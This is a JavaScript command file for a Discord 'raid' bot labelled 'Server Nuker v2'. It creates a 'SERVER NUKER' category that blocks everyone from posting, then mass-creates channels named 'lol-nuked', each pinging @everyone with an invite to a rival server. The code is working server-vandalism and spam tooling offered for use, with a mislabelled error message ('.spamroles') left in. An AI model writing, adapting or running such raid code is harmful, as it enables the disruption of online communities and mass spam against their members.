const Commando = require("discord.js-commando");
const Discord = require("discord.js");

module.exports = class TextChannelCommand extends Commando.Command {
  constructor(client) {
    super(client, {
      name: "stc",
      memberName: "spamtextchannels",
      group: "raid",
      description: "Spams text channels",
      argsType: "multiple",
      clientPermissions: ["MANAGE_CHANNELS"],
      guildOnly: true,
      throttling: {
        usages: 1,
        duration: 10,
      },
    });
  }

  async run(message, args) {
    message.delete();

    const noNumEmbed = new Discord.MessageEmbed()
      .setAuthor("Spam Roles Command")
      .setFooter("Server Nuker v2", "https://i.imgur.com/BCDIf5E.jpg")
      .setDescription(
        "Error! Enter a valid number for the count\n`.spamroles <count> | .spamroles 3`"
      )
      .setColor("#ff0000");
    if (!args[0] || isNaN(parseFloat(args[0]))) {
      message.channel.send(noNumEmbed);
      return;
    }

    let count = Math.round(args[0]);

    let categoryId = "";
    message.guild.channels
      .create("| 💣 | SERVER NUKER", { type: "category" })
      .then((channel) => {
        channel.setPosition(0);
        categoryId = channel.id;
        channel.overwritePermissions([
          {
            id: message.guild.id,
            deny: ["SEND_MESSAGES"],
            allow: ["ADD_REACTIONS", "READ_MESSAGE_HISTORY", "VIEW_CHANNEL"],
          },
        ]);
      });
    let msg1;
    await message.channel
      .send(`Creating ${count} text channel/s...`)
      .then((m) => {
        msg1 = m;
      });

    for (let i = 1; i <= count; i++) {
      setTimeout(() => {
        message.guild.channels
          .create("lol-nuked", {
            type: "text",
            parent: categoryId,
            topic: "Epic nuker bot",
          })
          .then((channel) => {
            channel.send(
              `||@everyone||\nVenez dans un meilleur serveur ! https://discord.gg/nbS3dgfz3b`
            );
          });
      }, 1000);
    }

    await msg1.edit("Done!");
    setTimeout(() => {
      msg1.delete();
    }, 5000);

    const moment = require("moment");
    const time = moment().format("HH:mm:ss a");
    console.log(`${time} | Command Ran: spamtextchannel`);
  }
};
